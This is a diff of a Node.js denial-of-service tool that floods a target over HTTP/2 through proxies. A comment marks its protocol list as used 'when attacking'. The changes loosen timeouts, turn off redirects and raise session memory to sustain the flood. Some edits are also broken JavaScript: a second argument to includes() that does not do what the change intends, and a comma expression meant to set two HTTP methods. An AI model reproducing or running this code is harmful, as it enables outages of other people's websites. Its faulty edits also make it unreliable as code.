@@ -86,7 +86,7 @@ const net = require("net");
  
      connection.on("data", chunk => { //HTTP Version Fixed by Ibaaall 08-04-2023
          const response = chunk.toString("utf-8");
-         const isAlive = response.includes("HTTP/1.1 200");
+         const isAlive = response.includes("HTTP/1.1 200","HTTP/2 200");
          if (isAlive === false) {
              connection.destroy();
              return callback(undefined, "error: invalid response from proxy server");
@@ -107,7 +107,7 @@ const net = require("net");
  }
 
  const Socker = new NetSocket(); // Socket GET Fixed
- headers[":method"] = "GET";
+ headers[":method"] = "GET","POST";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers["accept"] = "/";
@@ -128,7 +128,7 @@ const net = require("net");
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 3
+         timeout: 10
      };
 
      Socker.HTTP(proxyOptions, (connection, error) => {
@@ -139,7 +139,7 @@ const net = require("net");
          const tlsOptions = {
             ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'], // Protocol List ketika ATTACK
             challengesToSolve: Infinity,
-            followAllRedirects: true,
+            followAllRedirects: false,
             clientTimeout: Infinity,
             clientlareMaxTimeout: Infinity,
             maxRedirects: Infinity,
@@ -169,7 +169,7 @@ const net = require("net");
             maxHeaderListSize: 262144,
             enablePush: false
           },
-             maxSessionMemory: 3333,
+             maxSessionMemory: 33333,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn,
              socket: connection,
